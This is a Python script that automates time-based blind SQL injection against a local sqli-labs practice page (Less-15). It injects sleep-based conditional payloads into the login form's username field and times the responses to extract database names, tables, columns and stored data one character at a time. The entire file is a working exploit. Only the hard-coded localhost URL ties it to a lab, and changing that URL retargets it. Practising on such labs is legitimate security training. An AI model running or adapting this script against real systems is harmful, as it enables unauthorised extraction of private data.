import requests as req
from time import sleep
from time import time
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

baseurl = 'http://127.0.0.1:81/Less-15/'
# less15:'  less16:")
poc = '\''
sleepTime = 1
postData = {
    'uname': 'admin'+poc,
    'passwd': '1',
    'submit': 'Submit'
}


def post(url, header=standardHeader, data=postData):
    res = req.post(url, headers=header, data=data)
    return res


def checkRes(startTime, endTime):
    if endTime-startTime < sleepTime:
        return True
    else:
        return False


def forceDatabases(pocUrl):
    payload = "(select group_concat(schema_name) from information_schema.schemata)"
    print("Forcing database length")
    for databaseConcatLength in range(50,9999):
        startTime = time()
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(databaseConcatLength), str(sleepTime))}
        res = post(baseurl, data=expData)
        endTime = time()
        # print(expData)
        if not checkRes(startTime, endTime):
            print("Database length is {}\nForcing each char".format(databaseConcatLength))
            allDatabases = ''
            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
            for index in range(1,databaseConcatLength+1):
                for char in sqlForce:
                    startTime = time()
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char), str(sleepTime))}
                    res = post(baseurl, data=expData)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allDatabases = allDatabases + char
                        print(allDatabases)
                        break
            return allDatabases


def forceTables(pocUrl, database):
    payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    s = " union select 1,2,{} limit 1,1 -- -"
    print("Forcing all tables' length")
    for tableConcatLength in range(1, 9999):
        startTime = time()
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(
                       tableConcatLength), str(sleepTime))}
        res = post(baseurl, data=expData)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(tableConcatLength))
            allTables = ''
            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
            for index in range(1, tableConcatLength + 1):
                for char in sqlForce:
                    startTime = time()
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char), str(sleepTime))}
                    res = post(baseurl, data=expData)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allTables = allTables + char
                        print(allTables)
                        break
            return allTables


def forceColumns(pocUrl, table):
    payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    print("Forcing all columns' length")
    for columnConcatLength in range(1, 9999):
        startTime = time()
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(
                       columnConcatLength), str(sleepTime))}
        res = post(baseurl, data=expData)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(columnConcatLength))
            allColumns = ''
            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
            for index in range(1, columnConcatLength + 1):
                for char in sqlForce:
                    startTime = time()
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char), str(sleepTime))}
                    res = post(baseurl, data=expData)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allColumns = allColumns + char
                        print(allColumns)
                        break
            return allColumns


def dumpData(pocUrl, database, table, column='*'):
    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
    print("Forcing all data's length")
    for dataConcatLength in range(1, 9999):
        startTime = time()
        expData = {'passwd': '1', 'submit': 'Submit',
                   'uname': postData['uname'] + ' and if(length({})<{}, sleep({}), 1) -- -'.format(payload, str(
                       dataConcatLength), str(sleepTime))}
        res = post(baseurl, data=expData)
        endTime = time()
        if not checkRes(startTime, endTime):
            print("Tables length is {}\nForcing each char".format(dataConcatLength))
            allData = ''
            payload = "and if(ascii(substr(" + payload + ",{},1))={}, sleep({}), 1) -- -"
            for index in range(1, dataConcatLength + 1):
                for char in sqlForce:
                    startTime = time()
                    expData = {'passwd': '1', 'submit': 'Submit',
                               'uname': postData['uname'] + payload.format(str(index), ord(char), str(sleepTime))}
                    res = post(baseurl, data=expData)
                    endTime = time()
                    if not checkRes(startTime, endTime):
                        allData = allData + char
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    databases = forceDatabases(baseurl+poc)
    print('Input a database to force all tables:')
    database = input()
    tables = forceTables(baseurl+poc, database)
    print('Input a table to force all columns:')
    table = input()
    columns = forceColumns(baseurl+poc, table)
    print('Input a column to force all data:')
    dumpColumn = input()
    data = dumpData(baseurl+poc, database=database, table=table, column=dumpColumn)
    print(data)

